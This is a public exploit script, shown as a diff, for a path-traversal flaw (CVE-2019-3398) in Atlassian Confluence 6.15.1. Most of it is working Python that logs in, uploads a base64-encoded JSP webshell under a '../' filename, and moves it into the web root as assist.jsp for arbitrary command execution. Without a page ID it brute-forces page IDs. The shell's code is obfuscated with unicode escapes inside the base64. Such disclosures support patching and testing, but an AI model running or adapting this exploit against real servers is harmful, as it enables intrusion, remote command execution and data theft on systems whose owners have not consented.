@@ -1,0 +1,357 @@
+# Exploit Title: Atlassian Confluence 6.15.1 - Directory Traversal
+# Google Dork: N/A
+# Date: 2019-11-11
+# Exploit Author: max7253
+# Vendor Homepage: https://www.atlassian.com
+# Software Link: https://www.atlassian.com/software/confluence/download-archives
+# Version: 6.15.1
+# Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, Linux 5.0.0-23-generic #24~18.04.1-Ubuntu
+# CVE : 2019-3398
+
+#Confluence Arbitrary File Write via Path Traversal (CVE-2019-3398)
+#To use this exploit you should specify the following variables:
+#OS - Linux or Windows.
+#PROTO - http or https.
+#USERNAME and PASSWORD - the login/password to log into the web interface of the Atlassian Confluence server.
+#HOSTNAME - the domain name or IP address of the server and its port.
+#ROOTFOLDER - the root directory of the web server. If the root directory is located in C:\confluence\pages\, set this variable to ROOTFOLDER = 'confluence/pages/'.
+#Typical ROOTFOLDER locations are:
+#Windows: Program Files/Atlassian/Confluence/confluence/pages/
+#Linux: opt/atlassian/confluence/confluence/pages/
+#Note that the root directory of the web server and the temporary directory of the Atlassian Confluence server on Windows must be on the same drive (C:\ in the example above).
+#PAGEID - the pageId URL parameter you see in the browser address bar when you vist the Atlassian Confluence page where you have rights to upload files.
+#For example, https://server.net/pages/viewpageattachments.action?pageId=111111111&metadataLink=true.
+#If PAGEID is set to 0, the script will try to create a new Page ID in one of the available spaces. If it fails, it will try to create a new space and create a Page ID there.
+#If PAGEID is not specified, the script will walk though the PAGEID_RANGE_START..PAGEID_RANGE_END range and try to upload shellcode till it succeeds.
+#The script gets authenticated to the Atlassian Confluence server, retrieves the ATLASSIAN TOKEN from the server response, uploads the webshell, then imitates the 'Download all' action to place the webshell to the root directory of the web server.
+#Tested on Atlassian v6.15.1. on Linux and Windows.
+#Note that on Linux Confluence runs under the 'confluence' account which may not have rights to save files in the root directory of the web server. In this case the exploit will fail. Also, to create a new space and get the list of existing spaces the script makes use of Confluence REST API, which is available starting from Confluence Server 5.5.
+import requests
+import urllib3
+import base64
+from bs4 import BeautifulSoup
+import numpy as np
+import re
+import json
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+OS = 'Windows' #change this parameter
+PROTO = 'http' #change this parameter
+USERNAME = 'test' #change this parameter
+PASSWORD = 'test' #change this parameter
+HOSTNAME = '192.168.198.144:8090' #change this parameter
+ROOTFOLDER = 'Program Files/Atlassian/Confluence/confluence/pages/' #change this parameter (Windows)
+#ROOTFOLDER = 'opt/atlassian/confluence/confluence/pages/' #change this parameter (Linux)
+PAGEID = '0'#'1245201' #change this parameter
+PAGEID_RANGE_START = np.int64(1) #change this parameter
+PAGEID_RANGE_END = np.int64(999999999999) #change this parameter
+ATLTOKEN = ''
+LOGINURL = '%s://%s/dologin.action' % (PROTO, HOSTNAME)
+UPLOADURL = '%s://%s/plugins/drag-and-drop/upload.action' % (PROTO, HOSTNAME)
+DOWNLOADALLURL = '%s://%s/pages/downloadallattachments.action' % (PROTO, HOSTNAME)
+CREATEPAGEURL = '%s://%s/pages/createpage.action?spaceKey=' % (PROTO, HOSTNAME)
+VIEWSPACESURL= '%s://%s/rest/api/space' % (PROTO, HOSTNAME)
+WEBSHELLURL = '%s://%s/pages/assist.jsp' % (PROTO, HOSTNAME)
+
+SHELLCODE_WINDOWS = 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLiosamF2YS5uZXQuKiIlPgo8SFRNTD \
+48Qk9EWT4KPEZPUk0gTUVUSE9EPSJQT1NUIiBOQU1FPSJib29raW5nIiBBQ1RJT049IiI+CjxJTlBV \
+VCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZC \
+I+CjwvRk9STT4gCjxwcmU+CjwlIApcdTAwNjlcdTAwNjZcdTAwMjBcdTAwMjhcdTAwNzJcdTAwNjVc \
+dTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNT \
+BcdTAwNjFcdTAwNzJcdTAwNjFcdTAwNkRcdTAwNjVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAw \
+MjJcdTAwNjNcdTAwNkRcdTAwNjRcdTAwMjJcdTAwMjlcdTAwMjBcdTAwMjFcdTAwM0RcdTAwMjBcdT \
+AwNkVcdTAwNzVcdTAwNkNcdTAwNkNcdTAwMjlcdTAwMjBcdTAwN0JcdTAwMEFcdTAwMjBcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNkZcdTAwNzVcdTAwNzRcdTAwMk \
+VcdTAwNzBcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNzRcdTAwNkNcdTAwNkVcdTAwMjhcdTAwMjJcdTAw \
+NDNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNjFcdTAwNkVcdTAwNjRcdTAwM0FcdTAwMjBcdTAwMjJcdT \
+AwMjBcdTAwMkJcdTAwMjBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRc \
+dTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTBcdTAwNjFcdTAwNzJcdTAwNjFcdTAwNkRcdTAwNj \
+VcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjJcdTAwNjNcdTAwNkRcdTAwNjRcdTAwMjJcdTAw \
+MjlcdTAwMjBcdTAwMkJcdTAwMjBcdTAwMjJcdTAwNUNcdTAwNkVcdTAwM0NcdTAwNDJcdTAwNTJcdT \
+AwM0VcdTAwMjJcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMDlcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlc \
+dTAwNkVcdTAwNjdcdTAwNUJcdTAwNURcdTAwMjBcdTAwNjNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNj \
+FcdTAwNkVcdTAwNjRcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNkVcdTAwNjVcdTAwNzdcdTAwMjBcdTAw \
+NTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNjdcdTAwNUJcdTAwNURcdTAwMjBcdTAwN0JcdT \
+AwMjJcdTAwNjNcdTAwNkRcdTAwNjRcdTAwMkVcdTAwNjVcdTAwNzhcdTAwNjVcdTAwMjJcdTAwMkNc \
+dTAwMjBcdTAwMjJcdTAwMkZcdTAwNjNcdTAwMjJcdTAwMkNcdTAwMjBcdTAwNzJcdTAwNjVcdTAwNz \
+FcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTBcdTAw \
+NjFcdTAwNzJcdTAwNjFcdTAwNkRcdTAwNjVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjJcdT \
+AwNjNcdTAwNkRcdTAwNjRcdTAwMjJcdTAwMjlcdTAwN0RcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNTBcdTAwNzJcdTAwNkZcdTAwNj \
+NcdTAwNjVcdTAwNzNcdTAwNzNcdTAwMjBcdTAwNzBcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNTJcdTAw \
+NzVcdTAwNkVcdTAwNzRcdTAwNjlcdTAwNkRcdTAwNjVcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdT \
+AwNTJcdTAwNzVcdTAwNkVcdTAwNzRcdTAwNjlcdTAwNkRcdTAwNjVcdTAwMjhcdTAwMjlcdTAwMkVc \
+dTAwNjVcdTAwNzhcdTAwNjVcdTAwNjNcdTAwMjhcdTAwNjNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNj \
+FcdTAwNkVcdTAwNjRcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAw \
+MjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNEZcdTAwNzVcdTAwNzRcdTAwNzBcdTAwNzVcdTAwNzRcdT \
+AwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRcdTAwMjBcdTAwNkZcdTAwNzNcdTAwMjBc \
+dTAwM0RcdTAwMjBcdTAwNzBcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNEZcdTAwNzVcdTAwNz \
+RcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRcdTAw \
+MjhcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdT \
+AwMjBcdTAwMjBcdTAwNDlcdTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJc \
+dTAwNjVcdTAwNjFcdTAwNkRcdTAwMjBcdTAwNjlcdTAwNkVcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNz \
+BcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDlcdTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAw \
+NTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRcdTAwMjhcdTAwMjlcdTAwM0JcdTAwMEFcdT \
+AwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNDRcdTAwNjFc \
+dTAwNzRcdTAwNjFcdTAwNDlcdTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNz \
+JcdTAwNjVcdTAwNjFcdTAwNkRcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwMjBcdTAwM0RcdTAw \
+MjBcdTAwNkVcdTAwNjVcdTAwNzdcdTAwMjBcdTAwNDRcdTAwNjFcdTAwNzRcdTAwNjFcdTAwNDlcdT \
+AwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRc \
+dTAwMjhcdTAwNjlcdTAwNkVcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMj \
+BcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNkVcdTAw \
+NjdcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwNzJcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNjRcdT \
+AwNjlcdTAwNzNcdTAwMkVcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNENcdTAwNjlcdTAwNkVc \
+dTAwNjVcdTAwMjhcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMj \
+BcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNzdcdTAwNjhcdTAwNjlcdTAwNkNcdTAwNjVcdTAwMjBcdTAw \
+MjhcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwNzJcdTAwMjBcdTAwMjFcdTAwM0RcdTAwMjBcdT \
+AwNkVcdTAwNzVcdTAwNkNcdTAwNkNcdTAwMjBcdTAwMjlcdTAwMjBcdTAwN0JcdTAwMEFcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMj \
+BcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNkZcdTAwNzVcdTAwNzRcdTAwMkVcdTAw \
+NzBcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNzRcdTAwNkNcdTAwNkVcdTAwMjhcdTAwNjRcdTAwNjlcdT \
+AwNzNcdTAwNzJcdTAwMjlcdTAwM0JcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwNzJcdTAwMjBc \
+dTAwM0RcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwMkVcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNj \
+RcdTAwNENcdTAwNjlcdTAwNkVcdTAwNjVcdTAwMjhcdTAwMjlcdTAwM0JcdTAwMjBcdTAwN0RcdTAw \
+MEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwN0QKJT \
+4KPC9wcmU+CjwvQk9EWT48L0hUTUw+'
+
+SHELLCODE_LINUX ='PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLiosamF2YS5uZXQuKiIlPgo8SFRNTD \
+48Qk9EWT4KPEZPUk0gTUVUSE9EPSJQT1NUIiBOQU1FPSJib29raW5nIiBBQ1RJT049IiI+CjxJTlBV \
+VCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZC \
+I+CjwvRk9STT4gCjxwcmU+CjwlIApcdTAwNjlcdTAwNjZcdTAwMjBcdTAwMjhcdTAwNzJcdTAwNjVc \
+dTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNT \
+BcdTAwNjFcdTAwNzJcdTAwNjFcdTAwNkRcdTAwNjVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAw \
+MjJcdTAwNjNcdTAwNkRcdTAwNjRcdTAwMjJcdTAwMjlcdTAwMjBcdTAwMjFcdTAwM0RcdTAwMjBcdT \
+AwNkVcdTAwNzVcdTAwNkNcdTAwNkNcdTAwMjlcdTAwMjBcdTAwN0JcdTAwMEFcdTAwMjBcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNkZcdTAwNzVcdTAwNzRcdTAwMk \
+VcdTAwNzBcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNzRcdTAwNkNcdTAwNkVcdTAwMjhcdTAwMjJcdTAw \
+NDNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNjFcdTAwNkVcdTAwNjRcdTAwM0FcdTAwMjBcdTAwMjJcdT \
+AwMjBcdTAwMkJcdTAwMjBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRc \
+dTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTBcdTAwNjFcdTAwNzJcdTAwNjFcdTAwNkRcdTAwNj \
+VcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjJcdTAwNjNcdTAwNkRcdTAwNjRcdTAwMjJcdTAw \
+MjlcdTAwMjBcdTAwMkJcdTAwMjBcdTAwMjJcdTAwNUNcdTAwNkVcdTAwM0NcdTAwNDJcdTAwNTJcdT \
+AwM0VcdTAwMjJcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNjdcdTAwNU \
+JcdTAwNURcdTAwMjBcdTAwNjNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNjFcdTAwNkVcdTAwNjRcdTAw \
+MjBcdTAwM0RcdTAwMjBcdTAwNkVcdTAwNjVcdTAwNzdcdTAwMjBcdTAwNTNcdTAwNzRcdTAwNzJcdT \
+AwNjlcdTAwNkVcdTAwNjdcdTAwNUJcdTAwNURcdTAwMjBcdTAwN0JcdTAwMjJcdTAwMkZcdTAwNjJc \
+dTAwNjlcdTAwNkVcdTAwMkZcdTAwNzNcdTAwNjhcdTAwMjJcdTAwMkNcdTAwMjBcdTAwMjJcdTAwMk \
+RcdTAwNjNcdTAwMjJcdTAwMkNcdTAwMjBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAw \
+NzNcdTAwNzRcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTBcdTAwNjFcdTAwNzJcdTAwNjFcdT \
+AwNkRcdTAwNjVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjJcdTAwNjNcdTAwNkRcdTAwNjRc \
+dTAwMjJcdTAwMjlcdTAwN0RcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMj \
+BcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNTBcdTAwNzJcdTAwNkZcdTAwNjNcdTAwNjVcdTAwNzNcdTAw \
+NzNcdTAwMjBcdTAwNzBcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNTJcdTAwNzVcdTAwNkVcdTAwNzRcdT \
+AwNjlcdTAwNkRcdTAwNjVcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTJcdTAwNzVcdTAwNkVc \
+dTAwNzRcdTAwNjlcdTAwNkRcdTAwNjVcdTAwMjhcdTAwMjlcdTAwMkVcdTAwNjVcdTAwNzhcdTAwNj \
+VcdTAwNjNcdTAwMjhcdTAwNjNcdTAwNkZcdTAwNkRcdTAwNkRcdTAwNjFcdTAwNkVcdTAwNjRcdTAw \
+MjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdT \
+AwMjBcdTAwNEZcdTAwNzVcdTAwNzRcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJc \
+dTAwNjVcdTAwNjFcdTAwNkRcdTAwMjBcdTAwNkZcdTAwNzNcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNz \
+BcdTAwMkVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNEZcdTAwNzVcdTAwNzRcdTAwNzBcdTAwNzVcdTAw \
+NzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRcdTAwMjhcdTAwMjlcdTAwM0JcdT \
+AwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNDlc \
+dTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNk \
+RcdTAwMjBcdTAwNjlcdTAwNkVcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNzBcdTAwMkVcdTAwNjdcdTAw \
+NjVcdTAwNzRcdTAwNDlcdTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdT \
+AwNjVcdTAwNjFcdTAwNkRcdTAwMjhcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBc \
+dTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwNDRcdTAwNjFcdTAwNzRcdTAwNjFcdTAwND \
+lcdTAwNkVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAw \
+NkRcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNkVcdTAwNjVcdT \
+AwNzdcdTAwMjBcdTAwNDRcdTAwNjFcdTAwNzRcdTAwNjFcdTAwNDlcdTAwNkVcdTAwNzBcdTAwNzVc \
+dTAwNzRcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNkRcdTAwMjhcdTAwNjlcdTAwNk \
+VcdTAwMjlcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAw \
+MjBcdTAwMjBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNkVcdTAwNjdcdTAwMjBcdTAwNjRcdT \
+AwNjlcdTAwNzNcdTAwNzJcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwMkVc \
+dTAwNzJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNENcdTAwNjlcdTAwNkVcdTAwNjVcdTAwMjhcdTAwMj \
+lcdTAwM0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAw \
+MjBcdTAwNzdcdTAwNjhcdTAwNjlcdTAwNkNcdTAwNjVcdTAwMjBcdTAwMjhcdTAwMjBcdTAwNjRcdT \
+AwNjlcdTAwNzNcdTAwNzJcdTAwMjBcdTAwMjFcdTAwM0RcdTAwMjBcdTAwNkVcdTAwNzVcdTAwNkNc \
+dTAwNkNcdTAwMjBcdTAwMjlcdTAwMjBcdTAwN0JcdTAwMEFcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMj \
+BcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAw \
+MjBcdTAwMjBcdTAwMjBcdTAwNkZcdTAwNzVcdTAwNzRcdTAwMkVcdTAwNzBcdTAwNzJcdTAwNjlcdT \
+AwNkVcdTAwNzRcdTAwNkNcdTAwNkVcdTAwMjhcdTAwNjRcdTAwNjlcdTAwNzNcdTAwNzJcdTAwMjlc \
+dTAwM0JcdTAwMjBcdTAwNjRcdTAwNjlcdTAwNzNcdTAwNzJcdTAwMjBcdTAwM0RcdTAwMjBcdTAwNj \
+RcdTAwNjlcdTAwNzNcdTAwMkVcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNENcdTAwNjlcdTAw \
+NkVcdTAwNjVcdTAwMjhcdTAwMjlcdTAwM0JcdTAwMjBcdTAwN0RcdTAwMEFcdTAwMjBcdTAwMjBcdT \
+AwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwMjBcdTAwN0QKJT4KPC9wcmU+CjwvQk9EWT48 \
+L0hUTUw+'
+session = requests.session()
+#proxies = {
+# 'http': 'http://127.0.0.1:8080',
+# 'https': 'https://127.0.0.1:8080'
+#}
+
+def do_authenticate():
+	global ATLTOKEN
+	auth_form_data = {
+		'os_username': USERNAME,
+		'os_password': PASSWORD,
+		'login': 'Log+in',
+		'os_destination': ''
+	}
+
+	r = session.post(LOGINURL, data=auth_form_data, allow_redirects=True, verify=False)#, proxies=proxies)
+	
+	if r.text.find('re-enter your login') != -1:
+		print 'Authentication failed'
+		return 0			
+	elif r.text.find('Sorry, your username and/or password are incorrect') != -1:
+		print 'Authentication failed'
+		return 0
+	elif r.text.find('Unauthorized') != -1:
+		print 'Unauthorized'
+		return 0
+	else:
+		print 'Authentication successful'
+
+	soup = BeautifulSoup(r.text, 'html.parser')
+	ATLTOKEN = soup.find('meta', {'id': 'atlassian-token'})['content']
+	print 'Atlassian token %s' % (ATLTOKEN)
+	return 1
+
+def do_upload(_pageid):
+	if OS == 'Windows':
+		upload_form_data = SHELLCODE_WINDOWS
+
+		upload_req_params = {
+			'pageId': _pageid,
+			'filename': '../../../../../../../../../../' + ROOTFOLDER + 'assist.jsp',
+			'size': '3474',
+			'mimeType': 'text/plain',
+			'spaceKey': 'isis',
+			'atl_token': ATLTOKEN,
+			'name': 'assist'
+		}
+	elif OS == 'Linux':
+
+		upload_form_data = SHELLCODE_LINUX
+		upload_req_params = {
+			'pageId': _pageid,
+			'filename': '../../../../../../../../../../' + ROOTFOLDER + 'assist.jsp',
+			'size': '3516',
+			'mimeType': 'text/plain',
+			'spaceKey': 'isis',
+			'atl_token': ATLTOKEN,
+			'name': 'assist'
+		}
+
+	print 'Uploading webshell'
+	r = session.post(UPLOADURL, params=upload_req_params, data=base64.decodestring(upload_form_data), allow_redirects=True, verify=False)#, proxies=proxies)
+	if r.status_code == 200 and r.text.find('actionErrors') == -1:
+		print 'Webshell uploaded'
+		return 1		
+	else:
+		print 'Error while uploading webshell'
+		return 0
+
+def do_downloadall(_pageid):
+	downloadall_req_params = {
+		'pageId': _pageid
+	}
+	print 'Moving webshell to the root directory of the web server'
+	r = session.get(DOWNLOADALLURL, params=downloadall_req_params, allow_redirects=True, verify=False)#, proxies=proxies)
+	r = session.get(WEBSHELLURL, allow_redirects=True, verify=False)#, proxies=proxies)
+
+	if r.status_code == 200:
+		print 'Webshell found' 
+		print 'Visit %s' % WEBSHELLURL
+		return 1
+	else:
+		print 'Webshell not found'
+		return 0
+def do_getspaces():
+	print 'Getting spaces'
+	r = session.get(VIEWSPACESURL, allow_redirects=True, verify=False)#, proxies=proxies)
+	spacelist = re.findall(r'\"key\":\"(\w+)\"', r.text)
+	return spacelist
+
+def do_createspace():
+	print 'Creating space'
+	upload_form_data = json.dumps({
+		"key": "TST1",
+		"name": "Example space",
+		"description": {
+			"plain": {
+			"value": "This is an example space",
+			"representation": "plain"
+			}
+		},
+		"metadata": {}
+	})
+
+	headers = {
+		'Content-Type': 'application/json'
+	}
+	r = session.post(VIEWSPACESURL, data=upload_form_data, headers=headers, allow_redirects=True, verify=False)#, proxies=proxies)
+
+	matched = re.match(".*\"key\":\"(\w+)\".*", r.text)
+	if matched:
+		print 'Space created'
+		return matched.group(1)
+	else:
+		print 'Space not created'
+		return 0
+
+def do_createpage(space):
+	global PAGEID
+	print 'Trying %s space' % (space)
+	r = session.get(CREATEPAGEURL+space, allow_redirects=True, verify=False)#, proxies=proxies)
+	if r.status_code == 200 and r.text.find('ajs-draft-id') != -1:
+		soup = BeautifulSoup(r.text, 'html.parser')
+		pageid = soup.find('meta', {'name': 'ajs-draft-id'})['content']
+		pageid_pattern = re.compile("^(\d+)$")
+		if pageid_pattern.match(pageid):		
+			PAGEID = pageid
+			print 'Page ID created %s' % (pageid)
+			return 1
+		else:
+			print 'Unexpected Page ID format'
+			return 0
+	else:
+		print 'Page ID not created'
+		return 0	
+
+
+def main():
+	if do_authenticate() != 1:
+		exit()
+	
+	if PAGEID != '':
+		if PAGEID == '0':
+			spaces = do_getspaces()
+			for sp in spaces:
+				if do_createpage(sp) == 1:
+					if do_upload(PAGEID) != 1:
+						continue
+					if do_downloadall(PAGEID) != 1:
+						continue
+					else:
+						exit()
+			new_sp = do_createspace()
+			if new_sp != 0:
+				if do_createpage(new_sp) == 1:
+					if do_upload(PAGEID) != 1:
+						exit()
+					if do_downloadall(PAGEID) != 1:
+						exit()
+					exit()
+				else:
+					exit()
+			else:
+				exit()
+		if do_upload(PAGEID) != 1:
+			exit()
+		if do_downloadall(PAGEID) != 1:
+			exit()
+	else:
+		ID = PAGEID_RANGE_START
+		while ID <= PAGEID_RANGE_END:
+			print 'Trying Page Id %d' % (ID)
+			if do_upload(ID) == 1:
+				if do_downloadall(ID) == 1:
+					break
+			ID += 1
+
+if __name__ == "__main__":
+    main()
